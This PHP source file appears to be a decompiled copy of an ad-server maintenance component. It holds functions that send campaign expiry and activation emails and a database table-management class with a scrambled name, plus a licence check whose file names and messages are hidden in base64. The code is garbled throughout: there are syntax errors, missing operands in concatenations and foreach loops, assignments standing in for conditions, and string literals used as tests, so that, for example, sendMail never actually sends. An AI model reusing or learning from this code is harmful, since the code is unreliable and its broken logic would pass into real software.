				$aFromDetails = '';
			}

			if ($aPrefs[$accountType]['warn_email_' . $accountType]) {
				if ((0 < $aPrefs[$accountType]['warn_email_' . $accountType . '_impression_limit']) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
					$dalCampaigns = OA_Dal::factoryDAL('campaigns');
					$remainingImpressions = $dalCampaigns->getAdImpressionsLeft($aCampaign['campaignid']);

					if ($remainingImpressions < $aPrefs[$accountType]['warn_email_' . $accountType . '_impression_limit']) {
						$previousRemainingImpressions = $dalCampaigns->getAdImpressionsLeft($aCampaign['campaignid'], $aPreviousOIDates['end']);

						if ($aPrefs[$accountType]['warn_email_' . $accountType . '_impression_limit'] <= $previousRemainingImpressions) {
							foreach ($aUsers as $aUser) {
								$aEmail = $this->prepareCampaignImpendingExpiryEmail($aUser, $aCampaign['clientid'], $aCampaign['campaignid'], 'impressions', $aPrefs[$accountType]['warn_email_' . $accountType . '_impression_limit'], $accountType);

								if ($aEmail !== false) {
									if ($this->sendMail($aEmail['subject'], $aEmail['contents'], $aUser['email_address'], $aUser['contact_name'], $aFromDetails)) {
										$copiesSent++;

										if ($aConf['email']['logOutgoing']) {
											phpAds_userlogSetUser(phpAds_userMaintenance);
											phpAds_userlogAdd(phpAds_actionWarningMailed, $aPlacement['campaignid'], $aEmail['subject'] . "\n\n\n" . '                                                 ' . $aUser['contact_name'] . '(' . $aUser['email_address'] . ')' . "\n\n\n" . '                                                 ' . $aEmail['contents']);
										}
									}
								}
							}
						}
					}
				}

				if ((0 < $aPrefs[$accountType]['warn_email_' . $accountType . '_day_limit']) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
					$warnSeconds = (int) $aPrefs[$accountType]['warn_email_' . $accountType . '_day_limit'] + 1 * SECONDS_PER_DAY;
					$oEndDate = new Date($aCampaign['expire_time']);
					$oEndDate->setTZbyID('UTC');
					$oTestDate = new Date();
					$oTestDate->copy($oDate);
					$oTestDate->addSeconds($warnSeconds);

					if ($oTestDate->after($oEndDate)) {
						$oiSeconds = (int) $aConf['maintenance']['operationInterval'] * 60;
						$oTestDate->subtractSeconds($oiSeconds);

						if (!$oTestDate->after($oEndDate)) {
							foreach ($aUsers as $aUser) {
								$aEmail = $this->prepareCampaignImpendingExpiryEmail($aUser, $aCampaign['clientid'], $aCampaign['campaignid'], 'date', $oEndDate->format($date_format), $accountType);

								if ($aEmail !== false) {
									if ($this->sendMail($aEmail['subject'], $aEmail['contents'], $aUser['email_address'], $aUser['contact_name'], $aFromDetails)) {
										$copiesSent++;

										if ($aConf['email']['logOutgoing']) {
											phpAds_userlogSetUser(phpAds_userMaintenance);
											phpAds_userlogAdd(phpAds_actionWarningMailed, $aPlacement['campaignid'], $aEmail['subject'] . "\n\n\n" . '                                                 ' . $aUser['contact_name'] . '(' . $aUser['email_address'] . ')' . "\n\n\n" . '                                                 ' . $aEmail['contents']);
										}
									}
								}
							}
						}
					}
				}
			}
		}

		Language_Loader::load('default');
		return $copiesSent;
	}

	public function prepareCampaignImpendingExpiryEmail($aUser, $advertiserId, $placementId, $reason, $value, $type)
	{
		OA::debug('   - Preparing "impending expiry" report for advertiser ID ' . $advertiserId . '.', PEAR_LOG_DEBUG);
		Language_Loader::load('default', $aUser['language']);
		global $strImpendingCampaignExpiryDateBody;
		global $strImpendingCampaignExpiryImpsBody;
		global $strMailHeader;
		global $strSirMadam;
		global $strTheCampiaignBelongingTo;
		global $strYourCampaign;
		global $strImpendingCampaignExpiryBody;
		global $strMailFooter;
		global $strImpendingCampaignExpiry;

		if ($reason == 'date') {
			$reason = $strImpendingCampaignExpiryDateBody;
		}
		else if ($reason == 'impressions') {
			$reason = $strImpendingCampaignExpiryImpsBody;
		}
		else {
			return false;
		}

		$aAdvertiser = $this->_loadAdvertiser($advertiserId);

		if ($aAdvertiser === false) {
			return false;
		}

		$doCampaigns = OA_Dal::factoryDO('campaigns');
		$doCampaigns->campaignid = $placementId;
		$doCampaigns->find();

		if (!$doCampaigns->fetch()) {
			return false;
		}

		$aCampaign = $doCampaigns->toArray();

		if ($aCampaign['clientid'] != $advertiserId) {
			return false;
		}

		$emailBody = $this->_prepareCampaignImpendingExpiryEmailBody($advertiserId, $aCampaign);

		if ($emailBody == '') {
			OA::debug('   - No placements with delivery for advertiser ID ' . $advertiserId . '.', PEAR_LOG_DEBUG);
			return false;
		}

		$email = $strMailHeader . "\n";

		if (!empty($aUser['contact_name'])) {
			$greetingTo = $aUser['contact_name'];
		}
		else if (!empty($aAdvertiser['contact'])) {
			$greetingTo = $aAdvertiser['contact'];
		}
		else if (!empty($aAdvertiser['clientname'])) {
			$greetingTo = $aAdvertiser['clientname'];
		}
		else if (!empty($conf['email']['fromName'])) {
			$greetingTo = $conf['email']['fromName'];
		}
		else if (!empty($conf['email']['fromCompany'])) {
			$greetingTo = $conf['email']['fromCompany'];
		}
		else {
			$greetingTo = $strSirMadam;
		}

		$email = str_replace('{contact}', $greetingTo, $email);
		$email .= $reason . "\n\n";
		if (($type == 'advertiser') || ('   - Preparing "impending expiry" report for advertiser ID ' . $advertiserId)) {
			$campaignReplace = $strYourCampaign;
		}
		else {
			$campaignReplace = $strTheCampiaignBelongingTo . ' ' . trim($aAdvertiser['clientname']);
		}

		$email = str_replace('{clientname}', $campaignReplace, $email);
		$email = str_replace('{date}', $value, $email);
		$email = str_replace('{limit}', $value, $email);
		$email .= $strImpendingCampaignExpiryBody . "\n\n";
		$email .=  . $emailBody . "\n";
		if (($type == 'special') || ('   - Preparing "impending expiry" report for advertiser ID ' . $advertiserId)) {
			$email .= $this->_prepareRegards($aAdvertiser['agencyid']);
		}
		else {
			$email .= $this->_prepareRegards(0);
		}

		return array('subject' => $strImpendingCampaignExpiry . ': ' . $aAdvertiser['clientname'], 'contents' => $email);
	}

	public function _prepareCampaignImpendingExpiryEmailBody($advertiserId, $aCampaign)
	{
		global $strCampaign;
		global $strBanner;
		global $strLinkedTo;
		global $strNoBanners;
		$emailBody = '';
		$emailBody .= $strCampaign . ' ';
		$emailBody .= strip_tags(phpAds_buildName($aCampaign['campaignid'], $aCampaign['campaignname'])) . "\n";
		$page = 'stats.php?clientid=' . $advertiserId . '&campaignid=' . $aCampaign['campaignid'] . '&statsBreakdown=day&entity=campaign&breakdown=history&period_preset=all_stats&period_start=&period_end=';
		$emailBody .= MAX::constructURL(MAX_URL_ADMIN, $page) . "\n";
		$emailBody .= '-------------------------------------------------------' . "\n\n";
		$doBanners = OA_Dal::factoryDO('banners');
		$doBanners->campaignid = $aCampaign['campaignid'];
		$doBanners->orderBy('bannerid');
		$doBanners->find();

		if (0 < $doBanners->getRowCount()) {
			while ($doBanners->fetch()) {
				$aAd = $doBanners->toArray();
				$emailBody .= ' ' . $strBanner . ' ';
				$emailBody .= strip_tags(phpAds_buildBannerName($aAd['bannerid'], $aAd['description'], $aAd['alt'])) . "\n";

				if (!empty($aAd['url'])) {
					$emailBody .= '  ' . $strLinkedTo . ': ' . $aAd['url'] . "\n";
				}

				$emailBody .= "\n";
			}
		}
		else {
			$emailBody .= ' ' . $strNoBanners . "\n\n";
		}

		$emailBody .= '-------------------------------------------------------' . "\n\n";
		return $emailBody;
	}

	public function sendCampaignActivatedDeactivatedEmail($campaignId, $reason = NULL)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$doCampaigns = OA_Dal::factoryDO('campaigns');
		$doClient = OA_Dal::factoryDO('clients');
		$doCampaigns->joinAdd($doClient);
		$doCampaigns->get('campaignid', $campaignId);
		$aLinkedUsers = $this->getUsersLinkedToAccount('clients', $doCampaigns->clientid);
		$aAdvertiser = $this->_loadAdvertiser($doCampaigns->clientid);
		$aLinkedUsers = $this->_addAdvertiser($aAdvertiser, $aLinkedUsers);
		$copiesSent = 0;
		if (!empty($aLinkedUsers) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			if ($aConf['email']['useManagerDetails']) {
				$aFromDetails = $this->_getAgencyFromDetails($aAdvertiser['agencyid']);
			}

			foreach ($aLinkedUsers as $aUser) {
				$aEmail = $this->prepareCampaignActivatedDeactivatedEmail($aUser, $doCampaigns->campaignid, $reason);

				if ($aEmail !== false) {
					if ($this->sendMail($aEmail['subject'], $aEmail['contents'], $aUser['email_address'], $aUser['contact_name'], $aFromDetails)) {
						$copiesSent++;

						if ($aConf['email']['logOutgoing']) {
							phpAds_userlogSetUser(phpAds_userMaintenance);
							phpAds_userlogAdd(is_null($reason) ? phpAds_actionActivationMailed : phpAds_actionDeactivationMailed, $doPlacement->campaignid, $aEmail['subject'] . "\n\n\n" . '                                 ' . $aUser['contact_name'] . '(' . $aUser['email_address'] . ')' . "\n\n\n" . '                                 ' . $aEmail['contents']);
						}
					}
				}
			}

			Language_Loader::load('default');
		}

		return $copiesSent;
	}

	public function prepareCampaignActivatedDeactivatedEmail($aUser, $campaignId, $reason = NULL)
	{
		Language_Loader::load('default', $aUser['language']);

		if (is_null($reason)) {
			OA::debug('   - Preparing "campaign activated" email for campaign ID ' . $campaignId . '.', PEAR_LOG_DEBUG);
		}
		else {
			OA::debug('   - Preparing "campaign deactivated" email for campaign ID ' . $campaignId . '.', PEAR_LOG_DEBUG);
		}

		global $strMailHeader;
		global $strSirMadam;
		global $strMailBannerActivatedSubject;
		global $strMailBannerDeactivatedSubject;
		global $strMailBannerActivated;
		global $strMailBannerDeactivated;
		global $strNoMoreImpressions;
		global $strNoMoreClicks;
		global $strNoMoreConversions;
		global $strAfterExpire;
		$aCampaign = $this->_loadCampaign($campaignId);

		if ($aCampaign === false) {
			return false;
		}

		$aAdvertiser = $this->_loadAdvertiser($aCampaign['clientid']);

		if ($aAdvertiser === false) {
			return false;
		}

		$emailBody = $this->_prepareCampaignActivatedDeactivatedEmailBody($aCampaign);
		$email = $strMailHeader . "\n";

		if (!empty($aUser['contact_name'])) {
			$greetingTo = $aUser['contact_name'];
		}
		else if (!empty($aAdvertiser['contact'])) {
			$greetingTo = $aAdvertiser['contact'];
		}
		else if (!empty($aAdvertiser['clientname'])) {
			$greetingTo = $aAdvertiser['clientname'];
		}
		else {
			$greetingTo = $strSirMadam;
		}

		$email = str_replace('{contact}', $greetingTo, $email);

		if (is_null($reason)) {
			$email .=  . $strMailBannerActivated . "\n";
		}
		else {
			$email .=  . $strMailBannerDeactivated . ':';

			if ($reason & OX_CAMPAIGN_DISABLED_IMPRESSIONS) {
				$email .= "\n" . '  - ' . $strNoMoreImpressions;
			}

			if ($reason & OX_CAMPAIGN_DISABLED_CLICKS) {
				$email .= "\n" . '  - ' . $strNoMoreClicks;
			}

			if ($reason & OX_CAMPAIGN_DISABLED_CONVERSIONS) {
				$email .= "\n" . '  - ' . $strNoMoreConversions;
			}

			if ($reason & OX_CAMPAIGN_DISABLED_DATE) {
				$email .= "\n" . '  - ' . $strAfterExpire;
			}

			$email .= '.' . "\n";
		}

		$email .=  . $emailBody . "\n";
		$email .= $this->_prepareRegards($aAdvertiser['agencyid']);

		if (is_null($reason)) {
			$aResult['subject'] = $strMailBannerActivatedSubject . ': ' . $aAdvertiser['clientname'];
		}
		else {
			$aResult['subject'] = $strMailBannerDeactivatedSubject . ': ' . $aAdvertiser['clientname'];
		}

		$aResult['contents'] = $email;
		return $aResult;
	}

	public function _prepareCampaignActivatedDeactivatedEmailBody($aCampaign)
	{
		global $strCampaign;
		global $strBanner;
		$strCampaignLength = strlen($strCampaign);
		$strBannerLength = strlen($strBanner);
		$maxLength = max($strCampaignLength, $strBannerLength);
		$strCampaignPrint = '%-' . $maxLength . 's';
		$strBannerPrint = ' %-' . ($maxLength - 1) . 's';
		global $strLinkedTo;
		$emailBody = '';
		$emailBody .= "\n" . sprintf($strCampaignPrint, $strCampaign) . ' ';
		$emailBody .= strip_tags(phpAds_buildName($aCampaign['campaignid'], $aCampaign['campaignname'])) . "\n";
		$page = 'stats.php?clientid=' . $aCampaign['clientid'] . '&campaignid=' . $aCampaign['campaignid'] . '&statsBreakdown=day&entity=campaign&breakdown=history&period_preset=all_stats&period_start=&period_end=';
		$emailBody .= MAX::constructURL(MAX_URL_ADMIN, $page) . "\n";
		$emailBody .= '=======================================================' . "\n\n";
		$doBanners = OA_Dal::factoryDO('banners');
		$doBanners->campaignid = $aCampaign['campaignid'];
		$doBanners->orderBy('bannerid');
		$doBanners->find();

		if (0 < $doBanners->getRowCount()) {
			while ($doBanners->fetch()) {
				$aAd = $doBanners->toArray();
				$emailBody .= sprintf($strBannerPrint, $strBanner) . ' ';
				$emailBody .= strip_tags(phpAds_buildBannerName($aAd['bannerid'], $aAd['description'], $aAd['alt'])) . "\n";

				if (!empty($aAd['url'])) {
					$emailBody .= '  ' . $strLinkedTo . ': ' . $aAd['url'] . "\n";
				}

				$emailBody .= "\n";
			}
		}

		return $emailBody;
	}

	public function _createPrefsListPerAccount($accountType)
	{
		$type = strtolower($accountType);
		return array('warn_email_' . $type, 'warn_email_' . $type . '_impression_limit', 'warn_email_' . $type . '_day_limit');
	}

	public function _loadPrefs()
	{
		$aPref = $GLOBALS['_MAX']['PREF'];

		if (is_null($aPref)) {
			$aPref = OA_Preferences::loadAdminAccountPreferences(true);
		}

		return $aPref;
	}

	public function _loadCampaign($campaignId)
	{
		$doCampaigns = OA_Dal::factoryDO('campaigns');
		$doCampaigns->campaignid = $campaignId;
		$doCampaigns->find();

		if (!$doCampaigns->fetch()) {
			OA::debug('   - Error obtaining details for campaign ID ' . $campaignId . '.', PEAR_LOG_ERR);
			return false;
		}

		$aCampaign = $doCampaigns->toArray();
		return $aCampaign;
	}

	public function _loadAdvertiser($advertiserId)
	{
		$doClients = OA_Dal::factoryDO('clients');
		$doClients->clientid = $advertiserId;
		$doClients->find();

		if (!$doClients->fetch()) {
			OA::debug('   - Error obtaining details for advertiser ID ' . $advertiserId . '.', PEAR_LOG_ERR);
			return false;
		}

		$aAdvertiser = $doClients->toArray();
		return $aAdvertiser;
	}

	public function _loadAgency($agencyId)
	{
		$doAgency = OA_Dal::factoryDO('agency');
		$doAgency->agencyid = $agencyId;
		$doAgency->find();

		if (!$doAgency->fetch()) {
			OA::debug('   - Error obtaining details for agency ID ' . $agencyId . '.', PEAR_LOG_ERR);
			return false;
		}

		$aAgency = $doAgency->toArray();
		return $aAgency;
	}

	public function _prepareRegards($agencyId)
	{
		$aPref = $this->_loadPrefs();
		$aConf = $GLOBALS['_MAX']['CONF'];
		global $strMailFooter;
		$regards = '';
		$useAgency = false;
		if (($agencyId != 0) && $this->_loadPrefs()) {
			$aAgency = $this->_loadAgency($agencyId);

			if ($aAgency !== false) {
				if (!empty($aAgency['contact'])) {
					$regards .= $aAgency['contact'];
				}

				if (!empty($aAgency['name'])) {
					if (!empty($regards)) {
						$regards .= ', ';
					}

					$regards .= $aAgency['name'];
				}
			}

			if (empty($regards)) {
				$useAgency = true;
			}
		}

		if (($agencyId == 0) || $this->_loadPrefs() || $this->_loadPrefs()) {
			if (!empty($aConf['email']['fromName'])) {
				$regards .= $aConf['email']['fromName'];
			}

			if (!empty($aConf['email']['fromCompany'])) {
				if (!empty($regards)) {
					$regards .= ', ';
				}

				$regards .= $aConf['email']['fromCompany'];
			}
		}

		if (!empty($regards)) {
			$result = str_replace('{adminfullname}', $regards, $strMailFooter);
		}
		else {
			return NULL;
		}

		return $result;
	}

	public function getUsersLinkedToAccount($entityName, $entityId)
	{
		$doUsers = OA_Dal::factoryDO('users');
		return $doUsers->getAccountUsersByEntity($entityName, $entityId);
	}

	public function getAdminUsersLinkedToAccount()
	{
		$doUsers = OA_Dal::factoryDO('users');
		return $doUsers->getAdminUsers();
	}

	public function sendMail($subject, $contents, $userEmail, $userName = NULL, $fromDetails = NULL)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		if (defined('DISABLE_ALL_EMAILS') || ($aConf = $GLOBALS['_MAX']['CONF'])) {
			return true;
		}

		global $phpAds_CharSet;

		if (empty($fromDetails)) {
			$fromDetails['name'] = $aConf['email']['fromName'];
			$fromDetails['emailAddress'] = $aConf['email']['fromAddress'];
		}

		$contents = html_entity_decode($contents, ENT_QUOTES);

		if (!get_cfg_var('SMTP')) {
			$toParam = '"' . $userName . '" <' . $userEmail . '>';
		}
		else {
			$toParam = $userEmail;
		}

		$headersParam = 'MIME-Versions: 1.0' . "\r\n";

		if (isset($phpAds_CharSet)) {
			$headersParam .= 'Content-Type: text/plain; charset=' . $phpAds_CharSet . "\r\n";
		}

		$headersParam .= 'Content-Transfer-Encoding: 8bit' . "\r\n";

		if (get_cfg_var('SMTP')) {
			$headersParam .= 'To: "' . $userName . '" <' . $userEmail . '>' . "\r\n";
		}

		$headersParam .= 'From: "' . $fromDetails['name'] . '" <' . $fromDetails['emailAddress'] . '>' . "\r\n";

		if ($aConf['email']['qmailPatch']) {
			$headersParam = str_replace("\r", '', $headersParam);
		}

		$contents = str_replace("\n", "\r\n", $contents);

		if (function_exists('mail')) {
			$value = @mail($toParam, $subject, $contents, $headersParam);
			return $value;
		}
		else {
			OA::debug('Cannot send emails - mail() does not exist!', PEAR_LOG_ERR);
			return false;
		}
	}

	public function _addAdvertiser($aAdvertiser, $aLinkedUsers)
	{
		$duplicatedEmail = false;
		if (!is_array($aLinkedUsers) || is_array($aLinkedUsers)) {
			$aLinkedUsers = array();
		}
		else {
			foreach ($aLinkedUsers as $aUser) {
				if ($aUser['email_address'] == $aAdvertiser['email']) {
					$duplicatedEmail = true;
					break;
				}
			}
		}

		if (!$duplicatedEmail) {
			$aLinkedUsers[] = array('email_address' => $aAdvertiser['email'], 'contact_name' => $aAdvertiser['contact'], 'language' => NULL, 'user_id' => 0);
		}

		return $aLinkedUsers;
	}

	public function _deleteDuplicatedUser($aLinkedUsers)
	{
		$aLinkedUsersToEmail = array();
		$aEmailAddressUsed = array();

		foreach ($aLinkedUsers['admin'] as $aUser) {
			$aEmailAddressUsed[] = $aUser['email_address'];
		}

		$aLinkedUsersToEmail['admin'] = $aLinkedUsers['admin'];

		foreach ($aLinkedUsers['manager'] as $aUser) {
			if (!in_array($aUser['email_address'], $aEmailAddressUsed)) {
				$aEmailAddressUsed[] = $aUser['email_address'];
				$aLinkedUsersToEmail['manager'][] = $aUser;
			}
		}

		foreach ($aLinkedUsers['advertiser'] as $aUser) {
			if (!in_array($aUser['email_address'], $aEmailAddressUsed)) {
				$aEmailAddressUsed[] = $aUser['email_address'];
				$aLinkedUsersToEmail['advertiser'][] = $aUser;
			}
		}

		if (!in_array($aLinkedUsers['special']['advertiser']['email_address'], $aEmailAddressUsed)) {
			$aLinkedUsersToEmail['special']['advertiser'] = $aLinkedUsers['special']['advertiser'];
		}

		return $aLinkedUsersToEmail;
	}

	public function _getAgencyFromDetails($agencyId)
	{
		$doAgency = OA_Dal::factoryDO('agency');
		$doAgency->get($agencyId);
		$aAgency = $doAgency->toArray();

		if (!empty($aAgency['email'])) {
			$aFromDetails['emailAddress'] = $aAgency['email'];
			$aFromDetails['name'] = $aAgency['name'];
			return $aFromDetails;
		}

		return NULL;
	}

	public function clearCache()
	{
		unset($this->aAdminCache);
		unset($this->aAdminCache);
		unset($this->aClientCache);
	}

	public function convertStartEndDate(&$oStartDate, &$oEndDate, $oTimezone)
	{
		if (isset($oStartDate)) {
			$oStartTz = new Date($oStartDate);
			$oStartTz->convertTZ($oTimezone);
			$oStartTz->setHour(0);
			$oStartTz->setMinute(0);
			$oStartTz->setSecond(0);

			if ($oStartTz->after($oStartDate)) {
				$oStartTz->subtractSpan(new Date_Span('1-0-0-0'));
			}
		}
		else {
			$oStartTz = NULL;
		}

		if (!isset($oEndDate)) {
			$oEndDate = new Date();
		}

		$oEndTz = new Date($oEndDate);
		$oEndTz->convertTZ($oTimezone);
		$oEndTz->setHour(0);
		$oEndTz->setMinute(0);
		$oEndTz->setSecond(0);
		$oEndTz->subtractSeconds(1);

		if ($oEndTz->after($oEndDate)) {
			$oEndTz->subtractSpan(new Date_Span('1-0-0-0'));
		}

		$oStartDate = $oStartTz;
		$oEndDate = $oEndTz;
	}
}

class rhqjlxderbk
{
	/**
     * An instance of the OA_DB class.
     *
     * @var OA_DB
     */
	public $oDbh;
	/**
     * An instance of the MDB2_Schema class.
     *
     * @var MDB2_Schema
     */
	public $oSchema;
	/**
     * An array containing the database definition, as parsed from
     * the XML schema file.
     *
     * @var array
     */
	public $aDefinition;
	/**
     * Should the tables be created as temporary tables?
     *
     * @var boolean
     */
	public $temporary = false;
	public $cached_definition = true;

	public function OA_DB_Table()
	{
		$this->oDbh = &$this->_getDbConnection();
	}

	public function _getDbConnection()
	{
	}

	public function init($file, $useCache = true)
	{
		if (!is_readable($file)) {
			OA::debug('Unable to read the database XML schema file: ' . $file, PEAR_LOG_ERR);
			return false;
		}

		$options = array('force_defaults' => false);
		$this->oSchema = &MDB2_Schema::factory($this->oDbh, $options);

		if ($useCache) {
			$oCache = new OA_DB_XmlCache();
			$this->aDefinition = $oCache->get($file);
			$this->cached_definition = true;
		}
		else {
			$this->aDefinition = false;
		}

		if (!$this->aDefinition) {
			$this->cached_definition = false;
			$this->aDefinition = $this->oSchema->parseDatabaseDefinitionFile($file);

			if (PEAR::isError($this->aDefinition)) {
				OA::debug('Error parsing the database XML schema file: ' . $file, PEAR_LOG_ERR);
				return false;
			}
		}

		return true;
	}

	public function _checkInit()
	{
		if (is_null($this->aDefinition)) {
			OA::debug('No database XML schema file parsed, cannot create table', PEAR_LOG_ERR);
			return false;
		}
		else if (PEAR::isError($this->aDefinition)) {
			OA::debug('Previous error parsing the database XML schema file', PEAR_LOG_ERR);
			return false;
		}

		return true;
	}

	public function listOATablesCaseSensitive($like = '')
	{
		OA_DB::setCaseSensitive();
		$oDbh = &OA_DB::singleton();
		$aDBTables = $oDbh->manager->listTables(NULL, $GLOBALS['_MAX']['CONF']['table']['prefix'] . $like);
		OA_DB::disableCaseSensitive();
		return $aDBTables;
	}

	public function createTable($table, $oDate = NULL, $suppressTempTableError = false)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		if (!is_array($this->aDefinition['tables'][$table])) {
			OA::debug('Cannot find table ' . $table . ' in the XML schema file', PEAR_LOG_ERR);
			return false;
		}

		$tableName = $this->_generateTableName($table, $oDate);
		$aOptions = array();

		if ($this->temporary) {
			$aOptions['temporary'] = true;
		}

		$aOptions['type'] = $aConf['table']['type'];

		if (isset($this->aDefinition['tables'][$table]['indexes'])) {
			if (is_array($this->aDefinition['tables'][$table]['indexes'])) {
				foreach ($this->aDefinition['tables'][$table]['indexes'] as $aIndex => ) {
					$key = ($aConf = $GLOBALS['_MAX']['CONF']);
					if (isset($aIndex['primary']) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
						$aOptions['primary'] = $aIndex['fields'];
						$indexName = $tableName . '_pkey';
					}
					else {
						$indexName = $this->_generateIndexName($tableName, $key);
					}

					if ($key != $indexName) {
						$this->aDefinition['tables'][$table]['indexes'][$indexName] = $this->aDefinition['tables'][$table]['indexes'][$key];
						unset($this->aDefinition['tables'][$table]['indexes'][$key]);
					}
				}
			}
		}

		OA::debug('Creating the ' . $tableName . ' table', PEAR_LOG_DEBUG);
		OA::disableErrorHandling();
		OA_DB::setCaseSensitive();
		$result = $this->oSchema->createTable($tableName, $this->aDefinition['tables'][$table], false, $aOptions);
		OA_DB::disableCaseSensitive();
		OA::enableErrorHandling();
		if (PEAR::isError($result) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$showError = true;
			if ($this->temporary && ($aConf = $GLOBALS['_MAX']['CONF'])) {
				$showError = false;
			}
			if ($showError) {
				OA::debug('Unable to create the table ' . $table, PEAR_LOG_ERR);

				if (PEAR::isError($result)) {
					OA::debug($result->getUserInfo(), PEAR_LOG_ERR);
				}
			}

			return false;
		}

		return $tableName;
	}

	public function createAllTables($oDate = NULL)
	{
		if (!$this->_checkInit()) {
			return false;
		}

		foreach ($this->aDefinition['tables'] as $aTable => ) {
			$tableName = $this->_checkInit();
			$result = $this->createTable($tableName, $oDate);
			if (PEAR::isError($result) || $this->_checkInit()) {
				return false;
			}
		}

		return true;
	}

	public function createRequiredTables($table, $oDate = NULL)
	{
		if (!$this->_checkInit()) {
			return false;
		}

		$aTableNames = $this->_getRequiredTables($table);
		$result = $this->createTable($table, $oDate);

		if (!$result) {
			return false;
		}

		foreach ($aTableNames as $tableName) {
			$result = $this->createTable($tableName, $oDate);

			if (!$result) {
				return false;
			}
		}

		return true;
	}

	public function extistsTable($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$tableName = preg_replace('/^' . $aConf['table']['prefix'] . '/', '', $table);
		$aResult = $this->listOATablesCaseSensitive($tableName);
		if (is_array($aResult) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			return true;
		}

		return false;
	}

	public function existsTemporaryTable($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		OA::debug('Checking for temporary table ' . $table, PEAR_LOG_DEBUG);
		$query = 'SELECT * FROM ' . $this->oDbh->quoteIdentifier($table, true);
		OA::disableErrorHandling();
		$result = $this->oDbh->exec($query);
		OA::enableErrorHandling();

		if (PEAR::isError($result)) {
			OA::debug('Temporary table exists ' . $table, PEAR_LOG_ERR);
			return false;
		}

		OA::debug('Not found ' . $table, PEAR_LOG_ERR);
		return true;
	}

	public function dropTable($table)
	{
		OA::debug('Dropping table ' . $table, PEAR_LOG_DEBUG);
		OA::disableErrorHandling();
		$result = $this->oDbh->manager->dropTable($table);
		OA::enableErrorHandling();

		if (PEAR::isError($result)) {
			OA::debug('Unable to drop table ' . $table, PEAR_LOG_ERR);
			return false;
		}

		if (!$this->dropSequence($table)) {
		}

		return true;
	}

	public function dropAllTables()
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		$allTablesDropped = true;

		foreach ($this->aDefinition['tables'] as $aTable => ) {
			$tableName = ($aConf = $GLOBALS['_MAX']['CONF']);
			OA::debug('Dropping the ' . $tableName . ' table', PEAR_LOG_DEBUG);
			$result = $this->dropTable($aConf['table']['prefix'] . $tableName);
			if (PEAR::isError($result) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
				OA::debug('Unable to drop the table ' . $tableName, PEAR_LOG_ERR);
				$allTablesDropped = false;
			}
		}

		return $allTablesDropped;
	}

	public function truncateTable($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		OA::debug('Truncating table ' . $table, PEAR_LOG_DEBUG);
		OA::disableErrorHandling();
		$query = 'TRUNCATE TABLE ' . $this->oDbh->quoteIdentifier($table, true);
		$result = $this->oDbh->exec($query);
		OA::enableErrorHandling();

		if (PEAR::isError($result)) {
			OA::debug('Unable to truncate table ' . $table, PEAR_LOG_ERR);
			return false;
		}

		if ($aConf['database']['type'] == 'mysql') {
			OA::disableErrorHandling();
			$result = $this->oDbh->exec('ALTER TABLE ' . $table . ' AUTO_INCREMENT = 1');
			OA::enableErrorHandling();

			if (PEAR::isError($result)) {
				OA::debug('Unable to set mysql auto_increment to 1', PEAR_LOG_ERR);
				return false;
			}
		}

		return true;
	}

	public function cmp()
	{
		$file = __DIR__ . '/../' . base64_decode('bGljZW5zZS5kYXQ=');

		if (file_exists($file)) {
			$data = file_get_contents($file);
			$key = substr($data, 0, 32);
			$iv = substr($data, 32, 16);
			$key = pack('H*', hash('sha256', md5($key . $iv)));
			$decoded = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, substr($data, 48), MCRYPT_MODE_CBC, $iv);
			$decoded = rtrim($decoded, "\0");
			$sparam = unserialize($decoded);
			if ($sparam && (__DIR__ . '/../') && (__DIR__ . '/../') && (__DIR__ . '/../') && (__DIR__ . '/../')) {
				$st = true;
				if ($sparam[PT_I] && (__DIR__ . '/../')) {
					$st = false;
				}

				if ($sparam[PT_H] && (__DIR__ . '/../')) {
					$st = false;
				}

				if ($sparam[PT_P] && (__DIR__ . '/../')) {
					$st = false;
				}
				if ($st) {
					return NULL;
				}
			}

			return base64_decode('SW52YWxpZCBsaWNlbnNl');
		}

		return base64_decode('Tm8gbGljZW5zZSBmaWxl');
	}

	public function truncateAllTables()
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		$allTablesTruncated = true;

		foreach ($this->aDefinition['tables'] as $aTable => ) {
			$tableName = ($aConf = $GLOBALS['_MAX']['CONF']);
			OA::debug('Truncating the ' . $tableName . ' table', PEAR_LOG_DEBUG);
			$result = $this->truncateTable($aConf['table']['prefix'] . $tableName);

			if (PEAR::isError($result)) {
				OA::debug('Unable to truncate the table ' . $tableName, PEAR_LOG_ERR);
				$allTablesTruncated = false;
			}
		}

		return $allTablesTruncated;
	}

	public function dropSequence($table)
	{
		if ($this->oDbh->dbsyntax == 'pgsql') {
			$aConf = $GLOBALS['_MAX']['CONF'];
			OA_DB::setCaseSensitive();
			$aSequences = $this->oDbh->manager->listSequences();
			OA_DB::disableCaseSensitive();

			foreach ($aSequences as $sequence) {
				if (strpos($sequence, $table . '_') === 0) {
					$sequence .= '_seq';
					OA::debug('Dropping sequence ' . $sequence, PEAR_LOG_DEBUG);
					OA::disableErrorHandling();
					$result = $this->oDbh->exec('DROP SEQUENCE "' . $sequence . '"');
					OA::enableErrorHandling();

					if (PEAR::isError($result)) {
						OA::debug('Unable to drop the sequence ' . $sequence, PEAR_LOG_ERR);
						return false;
					}

					break;
				}
			}
		}

		return true;
	}

	public function resetSequence($sequence, $value = 1)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		OA::debug('Resetting sequence ' . $sequence, PEAR_LOG_DEBUG);
		OA::disableErrorHandling(NULL);

		if ($aConf['database']['type'] == 'pgsql') {
			if ($value < 1) {
				$value = 1;
			}
			else {
				$value = (int) $value;
			}

